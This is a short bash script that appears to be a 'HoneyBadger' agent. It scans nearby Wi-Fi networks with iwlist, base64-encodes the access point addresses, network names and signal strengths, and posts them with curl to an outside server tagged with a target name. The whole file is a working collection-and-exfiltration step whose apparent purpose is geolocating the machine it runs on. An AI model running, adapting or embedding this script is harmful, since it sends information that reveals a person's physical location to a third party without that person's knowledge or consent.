#!/bin/bash

honeybadger_url="https://prometheaninfosec.com/honeybadger-red/service.php"
target="mytarget"


agent="linuxbash"
os="linux"
data=$(iwlist scan | egrep 'Address|ESSID|Signal' | base64)

curl -i \
-X POST --data "agent=$agent&os=$os&target=$target&data=$data" $honeybadger_url
